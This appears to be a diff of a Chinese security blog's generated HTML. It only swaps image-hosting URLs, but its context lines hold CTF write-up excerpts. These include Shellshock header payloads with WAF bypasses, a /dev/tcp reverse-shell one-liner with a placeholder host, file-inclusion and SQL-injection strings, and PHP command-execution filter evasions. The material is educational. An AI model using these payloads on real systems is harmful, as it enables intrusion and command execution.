 &lt;/h3>&lt;p>这里讲讲几个虽然不属于提权，但是也比较有意思的几个点。&lt;/p>
 &lt;h4 id="echo">Echo
 &lt;/h4>&lt;p>&lt;code>echo *&lt;/code>可以用来显示目录，&lt;code>echo /???g&lt;/code>可以用来探测文件&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008270.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008270.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="ln">ln
@@ -14362,7 +14362,7 @@ loading="lazy"
 &lt;p>&lt;code>ln&lt;/code>命令常常用于链接两个文件，而且分两种链接模式，一种硬链接一种软链接，详细可以参考&lt;a class="link" href="https://www.ibm.com/developerworks/cn/linux/l-cn-hardandsymb-links/index.html" target="_blank" rel="noopener"
 >理解Linux硬链接与软链接&lt;/a>。这里主要讲讲软链接，软链接相当于我们 Windows 中的快捷方式，可以使用&lt;code>ln -s&lt;/code>创建&lt;/p>
 &lt;p>例如，这里我们根目录下有一个文件内容为&lt;code>flag{xxx}&lt;/code>的名为&lt;code>flag&lt;/code>文件，我们使用&lt;code>ln -s /flag file&lt;/code>，在当前目录下创建一个&lt;code>file&lt;/code>文件链接到&lt;code>/flag&lt;/code>，使用&lt;code>cat file&lt;/code>与&lt;code>php -r &amp;quot;echo file_get_contents('file')&amp;quot; &lt;/code>均可以读取到&lt;code>/flag&lt;/code>的内容。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005445.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005445.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这个软链接读取文件内容已经被多次利用&lt;/p>
@@ -14404,32 +14404,32 @@ env -i X=&amp;rsquo;;() { (a)=&amp;gt;' bash -c &amp;rsquo;echo date&amp;rsquo;;
 &lt;li>重定向读写文件&lt;/li>
 &lt;/ul>
 &lt;p>题目设置为几个功能，一个&lt;code>man&lt;/code>命令的帮助文档&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000217.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000217.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>选择了&lt;code>ls&lt;/code>，多了个请求参数&lt;code>file=ls&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009784.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009784.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>尝试用其他命令，比如&lt;code>find&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003424.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003424.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>猜测&lt;code>eval(&amp;quot;man /bin/&amp;quot; + command)&lt;/code>或者一些其他的目录&lt;/p>
 &lt;p>&lt;code>Tar Tester&lt;/code>界面可以上传压缩包但是并没有解压，只是&lt;code>tar -tvf test.tar&lt;/code>查看压缩包内的内容&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006647.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006647.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>&lt;code>Cmd Exec&lt;/code>界面只有两个命令，一个&lt;code>ls&lt;/code>，一个&lt;code>env&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000773.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000773.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>&lt;code>List files&lt;/code>是个目录列举界面，可以列举几个目录&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008062.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008062.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>观察题目，题目 url&lt;code>https://command-executor.hackme.inndy.tw/index.php?func=untar&lt;/code>等均带有&lt;code>func=xxx&lt;/code>参数来展示页面，猜测会有文件包含漏洞，尝试使用&lt;code>func=php://filter/read=convert.base64-encode/resource=index&lt;/code>读取文件内容，成功得到回显&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000836.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000836.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>解码得到 &lt;code>index.php&lt;/code>源码&lt;/p>
@@ -14914,7 +14914,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>接下来我们就可以利用&lt;code>ls.php&lt;/code>来找&lt;code>flag&lt;/code>了，因为&lt;code>ls.php&lt;/code>没什么过滤，所以用&lt;code>func=ls&amp;amp;file=../../../&lt;/code>可以发现根目录下的文件&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008571.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008571.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>接下来就是考虑怎么去读了，&lt;code>man.php&lt;/code>因为有&lt;code>preg_match('/^[\w\-]+$/', $file) !== 1&lt;/code>限制得比较死，&lt;code>untar.php&lt;/code>貌似只有&lt;code>tar -tvf&lt;/code>并没有什么用处，只有&lt;code>cmd.php&lt;/code>给出了一个比较不太寻常的&lt;code>env&lt;/code>这个命令，其实这样也算是提示得比较明显了，比较容易让人想到也可以比较容易搜到&lt;code>ShellShock&lt;/code>漏洞，并且在&lt;code>index.php&lt;/code>中发现有&lt;/p>
@@ -14992,16 +14992,16 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>我们就可以利用&lt;code>putenv&lt;/code>实现参数传递，直接设置&lt;code>User-agent: () { :;}; echo 222222&lt;/code>，发现被 waf&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000803.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000803.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>分析 waf 结合漏洞成因，我们可以在最后的&lt;code>};&lt;/code>中间添加一个空格绕过，设置&lt;code>User-Agent: () { :;} ; echo 222222&lt;/code>，成功发现输出 22222 ，我们也可以使用&lt;code>() { _; } &amp;gt;_[$($())] { whoami; }&lt;/code>这个 payload&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002148.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002148.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>发现当前用户为&lt;code>www-data&lt;/code>，而我们之前发现根目录&lt;code>flag&lt;/code>的权限为&lt;code>-r-------- 1 flag root 37 Jan 9 2018 flag&lt;/code>，所以不能直接读取，但是有一个&lt;code>flag-reader&lt;/code>与&lt;code>flag-reader.c&lt;/code>的文件，这应该是题目提示了。因为&lt;code>index.php&lt;/code>又把&lt;code>flag&lt;/code>关键字屏蔽了，我们也不能直接读取&lt;code>flag-reader.c&lt;/code>，但是我们这里可以利用通配符读取，例如使用&lt;code>fla*.c&lt;/code>&lt;/p>
 &lt;p>使用&lt;code>() { _; } &amp;gt;_[$($())] { cat /fla*.c; }&lt;/code>得到&lt;code>flag-reader.c&lt;/code>源码&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006944.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006944.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>Flag-reader.c:&lt;/p>
@@ -15079,13 +15079,13 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>使用&lt;code>bash -c &amp;quot;sh &amp;gt;&amp;amp; /dev/tcp/your ip/port 0&amp;gt;&amp;amp;1&amp;quot; &lt;/code>直接反弹 shell&lt;/p>
 &lt;p>运行&lt;code>flag-reader&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008222.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008222.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>审计一下这段代码，大致是输出一串随机数，然后在1s之内又要输入进去，否则就&lt;code>write(1, &amp;quot;Wrong response\n&amp;quot;, 16);&lt;/code>&amp;hellip;&lt;/p>
 &lt;p>然而我在回弹 shell 之后，利用&lt;code>/tmp&lt;/code>可写的权限，貌似有点小问题，一旦&lt;code>cat /tmp/zedd&lt;/code>，链接就断掉了，无奈只能找其他文件夹，发现&lt;code>/run/lock&lt;/code>与&lt;code>/var/tmp&lt;/code>均可读可写，使用&lt;code>/flag-reader flag &amp;gt; /run/lock/zedd &amp;lt; /run/lock/zedd&lt;/code>写入 flag&lt;/p>
 &lt;p>反弹 shell 使用&lt;code>cat&lt;/code>非常容易断掉，最好使用执行的方式，最后得到 flag&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001695.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001695.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="上篇的解释与补充">上篇的解释与补充
@@ -15388,7 +15388,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>跟进得到&lt;code>test.txt&lt;/code>的内容&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006888.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006888.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>猜测为文件包含，尝试直接读取&lt;code>flag&lt;/code>被&lt;code>waf&lt;/code>，直接读取&lt;code>https://cat.canhack.me/?file=index.php&lt;/code>&lt;/p>
@@ -15535,7 +15535,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">id&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">d1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">schema_name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">information_schema&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">schemata&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">limit&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">23&lt;/span>&lt;span class="w">
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001927.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001927.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;div class="highlight">&lt;div class="chroma">
@@ -15747,7 +15747,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>虽然页面不会直接回显，但是点击 id 的超链接过去就可以看到了&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002723.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002723.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-9">Example 9
@@ -15831,7 +15831,7 @@ loading="lazy"
 &lt;/blockquote>
 &lt;p>进入页面发现比之前多了一个修改的功能，这里以为是可以修改其他人的然后返回修改结果&amp;hellip;谁知道修改自己的都有点小 bug &amp;hellip;&lt;/p>
 &lt;p>后来发现，是可以通过编辑功能在 &lt;code>placeholder&lt;/code>处看到其他人的信息&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004348.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004348.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="mongodb-injection">MongoDB injection
@@ -15926,7 +15926,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009689.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009689.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="authentication">Authentication
@@ -16250,12 +16250,12 @@ loading="lazy"
 &lt;h4 id="example-5-2">Example 5
 &lt;/h4>&lt;p>这里就是几个验证码，而且都是形成了单词，比如 hacker/securtiy 等，官方给的是弄一个字典爆破&lt;/p>
 &lt;h4 id="example-6-2">Example 6
-&lt;/h4>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004116.jpg"
+&lt;/h4>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004116.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里是可以直接识别得出来的，字体并没有经过任何变换。&lt;/p>
 &lt;h4 id="example-7-1">Example 7
-&lt;/h4>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000030.jpg"
+&lt;/h4>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000030.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里只是加了蓝色的条纹，官方给出了去除条纹的脚本&lt;/p>
@@ -16274,7 +16274,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;h4 id="example-8-1">Example 8
-&lt;/h4>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009492.jpg"
+&lt;/h4>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009492.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里是 7 的进化，进行了一点扭曲&lt;/p>
@@ -16295,7 +16295,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;h4 id="example-9-1">Example 9
-&lt;/h4>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008020.jpg"
+&lt;/h4>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008020.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>简单计算，python 正则取出来直接&lt;code>eval&lt;/code>即可&lt;/p>
@@ -16504,7 +16504,7 @@ loading="lazy"
 &lt;p>[TOC]&lt;/p>
 &lt;h2 id="pre">Pre
 &lt;/h2>&lt;p>下载得到一个 iso 后直接用 vmware 装起来，&lt;code>ifconfig&lt;/code>得到 ip ，访问就可以看到主页了&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000990.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000990.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="hacking">Hacking
@@ -16877,7 +16877,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>得到&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005160.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005160.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-2-1">Example 2
@@ -17377,7 +17377,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">id,$b-&amp;gt;id);}system(&amp;#39;ls&amp;#39;);//
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003780.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003780.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-3-2">Example 3
@@ -17410,7 +17410,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>使用&lt;code>/e&lt;/code>修饰符，&lt;code>preg_replace&lt;/code>会将&lt;code>replacement&lt;/code>参数当作 PHP 代码执行，也就是&lt;code>$_GET['new']&lt;/code>&lt;/p>
 &lt;p>所以用&lt;code>new=system('id');&amp;amp;pattern=/test/e&amp;amp;base=jutst test&lt;/code>，即可执行任意命令。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008506.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008506.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="file-upload">File Upload
@@ -17488,7 +17488,7 @@ loading="lazy"
 &lt;/div>&lt;p>于是用&lt;code>%0a&lt;/code>换行执行命令&lt;/p>
 &lt;h4 id="example-3-4">Example 3
 &lt;/h4>&lt;p>直接在后面加貌似会被先过滤跳转，放到 burp 里面加就行了&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008206.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008206.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>看下源代码&lt;/p>
@@ -18871,7 +18871,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">``&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">updatexml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="n">x7e&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">user&lt;/span>&lt;span class="p">()),&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="n">x7e&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007581.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007581.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="表名不完全可控且desc的表名不含反引号select的表名含有反引号">表名不完全可控且DESC的表名不含反引号,SELECT的表名含有反引号
@@ -18920,7 +18920,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">`&lt;/span>&lt;span class="n">shop_user&lt;/span>&lt;span class="o">`&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">updatexml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="n">x5e24&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">user&lt;/span>&lt;span class="p">()),&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="n">x5e24&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">#``&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w">
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007624.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007624.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="无列名注入">无列名注入
@@ -22116,13 +22116,13 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>执行命令不只这几个函数，还有很多，这里就拿这几个来举例。毫无疑问，这里肯定是可以执行命令。&lt;/p>
 &lt;p>那我们先直接尝试读取&lt;code>/etc/passwd&lt;/code>，显然，这里还没到代码层面就直接被 waf 了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007415.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007415.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>原因可能是因为&lt;code>/etc/passwd&lt;/code>的敏感原因&lt;/p>
 &lt;h3 id="绕过-waf">绕过 waf
 &lt;/h3>&lt;p>那我们接下来先尝试绕过 waf ，可以尝试使用&lt;code>/etc/pas\swd&lt;/code>绕过，也可以使用其他空变量，当然方法很多&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002257.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002257.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以发现，我们是成功绕过 waf ，来到了代码层面，接下来我们就需要考虑怎么绕过命令执行函数了&lt;/p>
@@ -22204,15 +22204,15 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>也就是说&lt;code>$var(args)&lt;/code>跟&lt;code>“string”(args);&lt;/code>是与&lt;code>function(args)&lt;/code>等效的。于是我们可以有&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000584.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000584.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>尝试&lt;code>&amp;quot;\x73\x79\x73\x74\x65\x6d&amp;quot;(&amp;quot;whoami&amp;quot;)&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003062.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003062.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>确实可以执行无误，然后我们就可以利用这个特性绕过对&lt;code>system&lt;/code>的检测了&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009239.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009239.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="改进输入检测">改进输入检测
@@ -22239,15 +22239,15 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>增加了对单引号与双引号的检测，这时候应该怎么办呢&lt;/p>
 &lt;p>让我们再来看一个特性&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003524.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003524.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>也就是说在 PHP 中，字符串表达可以有以上这几种方法，于是我们可以用以上的方式尝试替代双引号。第一种是类似&lt;code>(system)(whoami);&lt;/code>，然而在 php 中我们可以用&lt;code>.&lt;/code>来拼接字符串，于是也可以有&lt;code>(sys.(te).m)(whoami);&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006608.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006608.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>也可以使用&lt;code>/?a=system&amp;amp;b=ls&amp;amp;code=$_GET[a]($_GET[b]);&lt;/code>的解析方法来绕过&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004860.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004860.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里我们还可以使用其他技巧，比如我们可以在函数名和参数内插入注释（这种方法在绕过某些WAF规则集方面非常有用，这些规则集会拦截特定的PHP函数名&lt;/p>
@@ -22265,10 +22265,10 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">php -r &amp;#34;(s/*foo*/.(ys)./*bar*/tem)/*this is a comment*/(wh./*foo*/(oa)/*bar*/.mi);&amp;#34;
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009365.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009365.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001559.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001559.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="get_defined_functions">get_defined_functions
@@ -22279,24 +22279,24 @@ loading="lazy"
 &lt;p>​ 获取所有已定义函数的数组。&lt;/p>
 &lt;/blockquote>
 &lt;p>这个函数是可将用户定义的和内置函数均返回的。获取内置函数可以使用&lt;code>$arr[“internal”]&lt;/code>，获取用户定义的函数可以使用&lt;code>$arr[“user”]&lt;/code>。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005250.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005250.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以我们可以尝试找到&lt;code>system&lt;/code>函数&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008754.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008754.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>配合前面的方法，效果拔群，不过&lt;code>system&lt;/code>函数不一定都是 1077 ，使用的时候最好可以&lt;code>grep&lt;/code>查找一下&lt;code>system&lt;/code>函数的下标&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003939.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003939.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="字符数组">字符数组
